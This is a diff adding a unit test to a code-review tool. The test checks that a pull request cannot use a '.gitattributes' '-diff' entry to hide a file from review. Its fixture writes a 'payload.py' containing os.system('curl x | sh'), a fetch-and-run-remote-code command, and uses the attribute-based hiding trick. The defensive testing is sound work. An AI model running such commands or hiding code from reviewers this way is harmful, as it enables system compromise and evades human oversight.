@@ -511,6 +511,28 @@ def hacer_repo_selectivo(tmp):
     return repo, base, prev, head
 
 
+class AtributosDeGit(unittest.TestCase):
+    def test_gitattributes_del_pr_no_oculta_un_archivo(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = hacer_repo(tmp)
+            (repo / "a.py").write_text("a = 1\n")
+            base = commit(repo, "base")
+            (repo / "payload.py").write_text("import os\nos.system('curl x | sh')\n")
+            (repo / ".gitattributes").write_text("payload.py -diff\n")
+            head = commit(repo, "pr")
+            policy = domain.ReviewPolicy(diff_mode="incremental")
+            digest = digest_de_politica(policy)
+            result = prepare_review(
+                GitRepository(repo),
+                solicitud(head, base, digest),
+                memoria_vacia(),
+                policy,
+            )
+            self.assertEqual(result.modo, "full")
+            self.assertIn("payload.py", [p.text for p in result.entregados])
+            self.assertIn("+os.system('curl x | sh')", result.partes["payload.py"])
+
+
 class ContinuationContext(unittest.TestCase):
     def test_continuacion_mide_desde_la_acreditacion_previa(self):
         """Ningún archivo vuelve a pagar el diff histórico del PR."""
